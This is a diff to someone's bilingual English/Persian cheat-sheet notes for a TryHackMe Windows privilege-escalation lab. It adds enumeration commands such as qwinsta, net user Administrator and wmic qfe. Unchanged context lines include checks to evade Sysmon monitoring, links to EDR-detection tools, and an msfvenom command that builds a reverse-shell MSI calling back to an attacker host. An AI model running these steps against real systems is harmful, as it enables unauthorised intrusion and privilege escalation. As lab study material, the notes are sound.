@@ -17,6 +17,7 @@ https://tryhackme.com/room/windowsprivescarena
 
 ## Basic-Enumeration ✅
 ```powershell
+hostname
 systeminfo        # System and Windows Information Like Hotfix(s)
 wmic os get Caption, Version, OSArchitecture # اطلاعات سیستم و ویندوز
 
@@ -30,12 +31,15 @@ net use Z: \\TARGET-IP\SharedFolder
 whoami 
 whoami /priv      # بررسی سطح دسترسی
 whoami /groups
+qwinsta # View users who are login at the same time
+query session # View users who are login at the same time
 --------------------------------------------------------------------------
 # Check password policy,  minimum password length, maximum password age, and lockout duration.
 net accounts # Check the system settings  
 net accounts /domain # Checking the system settings belongs to a domain
 --------------------------------------------------------------------------
-net user # List of system usernames     
+net user # List of system usernames
+net user Administrator # Check the details of a particular user
 net group # List of system Windows Domain Controller group
 net localgroup # List of system local system group
 net localgroup administrators  #  list the users that belong to the local administrators group
@@ -92,6 +96,8 @@ reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microso
 # If the hacker can access the Sysmon configuration file, he can find out what activities are being monitored and trying to erase his rejection!
 findstr /si '<ProcessCreate onmatch="exclude">' C:\tools\* 
 ----------------------------------------------------------------
+wmic qfe get Caption,Description,HotFixID,InstalledOn # Checking the system update level
+----------------------------------------------------------------
 # Check what are security software such as antivirus, EDR, or monitoring runs on the system with External tools
 https://github.com/PwnDexter/Invoke-EDRChecker
 https://github.com/PwnDexter/SharpEDRChecker
@@ -105,7 +111,8 @@ Get-Process -Name thm-demo # Checking Process activities associated with this se
 # Note: Process ID (PID) This is useful for the next steps.
 
 wmic product get name,version,vendor # چک کردن لیست همه‌ی نرم‌افزارهای نصب‌شده همراه با نسخه‌شون
-wmic service get name,displayname,pathname,startmode
+wmic service get name,displayname,pathname,startmode # Unquoted Service Path
+
 
 tasklist          # لیست پردازش‌های فعال
 tasklist | findstr <PID> 
@@ -191,7 +198,6 @@ schtasks /run /tn vulntask # target system
 ```cmd
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer # target system
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer # target system
-
 ------------------------------
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o malicious.msi # our kali
 # transfer malicious.msi file to our kali # target system
